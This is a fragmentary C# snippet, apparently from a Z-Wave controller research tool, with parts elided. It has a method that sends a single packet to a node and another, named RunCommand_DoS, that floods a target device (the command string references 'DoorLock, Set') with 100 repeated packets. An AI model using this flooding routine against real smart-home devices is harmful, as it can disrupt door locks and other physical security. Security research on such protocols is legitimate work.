...
namespace ZWave_Controller
{
    class Send_command
    {
        public static void RunCommand_Nonsecurity(ZWaveController controller,byte[] dst_node, byte[] packet, int number)
        {
            ...
            try
            {
                ...
                node.Id = dst_node[0];
                if (number == 1) node.SendDataRequest(packet);
                else node.SendDataRequest2(packet);
                node.Id = 0x04;
            }
            catch (Exception e)
            {
        ...
        public static void RunCommand_DoS(ZWaveController controller, byte[] dst_node, byte[] packet)
        {
            var command = "DoorLock, Set, 4, 5";
            ...
            try
            {
                ...
                node.Id = dst_node[0];
                for(int i=0; i<100; i++)    node.SendDataRequest(packet);
                node.Id = 0x04;
            }
            catch (Exception e)
            {
